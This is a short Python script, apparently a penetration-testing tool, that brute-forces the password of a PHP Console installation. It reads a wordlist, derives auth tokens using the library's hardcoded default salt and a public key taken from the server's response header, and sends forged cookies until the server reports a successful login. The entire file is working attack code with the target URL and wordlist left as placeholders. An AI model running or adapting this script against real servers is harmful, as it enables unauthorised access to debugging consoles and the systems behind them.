from pwn import *
import requests
import json

url = 'insert_here'
wordlist = open('insert_here', 'r')
salt = 'NeverChangeIt:)'  # https://github.com/barbushin/php-console/blob/master/src/PhpConsole/Auth.php
public_key = 'insert_here'  # Grab from response header - IP-based

for count, password in enumerate(wordlist):
    password = password.strip()
    if password:
        # sha256 the password and salt
        hashed_password = sha256sumhex((password + salt).encode())
        # sha256 the hashed password and the public key
        token = sha256sumhex((hashed_password + public_key).encode())

        # Build up a cookie
        php_console_server = 'php-console-server=5;'
        php_console_client = '{"php-console-client":5,"auth":{"publicKey":"' + public_key + '","token":"' + token + '"}}'
        headers = {'Cookie': php_console_server + 'php-console-client=' + b64e(php_console_client.encode())}

        # Send the request and grab PHP console header response
        response = requests.get(url, headers=headers)
        php_console_response = json.loads(response.headers['PHP-Console'])

        # Success?
        if(php_console_response['auth']['isSuccess']):
            print("Success! Correct password was: " + password)
            wordlist.close()
            quit()

        # Track progress / performance
        if((count + 1) % 100 == 0):
            print(str(count + 1) + " attempts so far..")

# Maybe we need new password list?
print("Failed to find correct password :(")
wordlist.close()
